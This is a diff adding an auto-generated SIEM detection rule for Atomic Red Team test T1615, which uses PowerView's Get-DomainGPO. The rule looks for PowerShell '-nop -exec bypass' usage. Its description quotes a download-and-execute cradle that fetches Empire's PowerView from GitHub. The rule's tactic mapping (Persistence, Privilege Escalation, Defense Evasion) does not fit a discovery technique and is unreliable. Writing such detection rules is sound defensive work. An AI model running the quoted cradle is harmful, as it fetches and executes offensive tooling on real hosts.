@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Get-DomainGPO to display group policy information via PowerView' (GUID: 4e524c4e-0e02-49aa-8df5-93f3f7959b9f) of technique T1615 (Group Policy Discovery). Test Description: Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.. Command/Steps: powershell -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712..."
+from = "now-9m"
+rule_id = "b66511e2-915d-4b47-979f-f2bd6421f061"
+language = "kql"
+name = "Atomic Test: T1615 - Get-DomainGPO to display group policy information via PowerView"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1615/T1615.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1615", "4e524c4e-0e02-49aa-8df5-93f3f7959b9f", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*-nop*\\\" AND powershell.script_block_text : \\\"*-exec*\\\" AND powershell.script_block_text : \\\"*bypass*\\\" OR (process.command_line : \\\"*-nop*\\\" AND process.command_line : \\\"*-exec*\\\" AND process.command_line : \\\"*bypass*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1615"
+name = "Get-DomainGPO to display group policy information via PowerView"
+reference = "https://attack.mitre.org/techniques/T1615"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1615"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1615"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1615"
+
+
